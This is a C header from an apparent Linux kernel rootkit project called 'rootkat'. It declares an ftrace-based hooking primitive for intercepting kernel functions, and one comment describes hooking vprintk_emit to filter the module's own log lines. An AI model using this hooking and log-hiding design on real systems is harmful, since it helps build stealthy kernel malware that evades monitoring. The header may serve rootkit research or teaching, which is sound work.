/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_FTRACE_HOOK_H
#define ROOTKAT_FTRACE_HOOK_H

#include <linux/ftrace.h>

/*
 * ftrace-based function hooking primitive.
 *
 * Lifecycle:
 *   1. Caller declares a (zero-initialized) struct rootkat_hook with
 *      .candidates (NULL-terminated symbol list) and .replacement set.
 *   2. rootkat_hook_install() resolves a candidate, installs the ftrace
 *      op, and writes .original (call this from the replacement to defer
 *      to the real function).
 *   3. rootkat_hook_remove() undoes both. Idempotent on never-installed.
 *
 * Constraints on .replacement:
 *   - Must NOT tail-call .original — gcc may sibling-call optimize the
 *     return through ftrace, which defeats the within_module recursion
 *     guard. Mark the replacement noinline if you need to be sure, or
 *     keep the call to original surrounded by other work.
 *   - Type-erased via void *; cast to the target's exact signature when
 *     invoking. ABI-safe on x86_64; theoretical strict-aliasing UB.
 *
 * Thread safety:
 *   - Not thread-safe per hook. Caller must serialize install/remove on
 *     the same struct. Module init/exit context is sufficient for v1.
 */
struct rootkat_hook {
	const char * const *candidates;  /* NULL-terminated symbol candidates */
	void *replacement;               /* called instead of target */
	void *original;                  /* set by install: call this to defer */
	unsigned long target;            /* resolved address; 0 = not installed */
	bool intercept_own_calls;        /* if true, skip the within_module
	                                  * recursion guard — replacement runs
	                                  * even when the caller is rootkat.ko
	                                  * itself. Required for the vprintk_emit
	                                  * hook (whose whole point is filtering
	                                  * our own pr_info lines). */
	struct ftrace_ops ops;
};

int rootkat_hook_install(struct rootkat_hook *h);

/*
 * Install a hook at a pre-resolved address, bypassing the candidates
 * list. Used when the symbol needed module-scoped resolution
 * (rootkat_lookup_in_module) and the caller already has the address.
 * Returns 0 on success; on failure h->target is left at 0 so remove
 * stays idempotent.
 */
int rootkat_hook_install_at(struct rootkat_hook *h, unsigned long addr);

void rootkat_hook_remove(struct rootkat_hook *h);

#endif
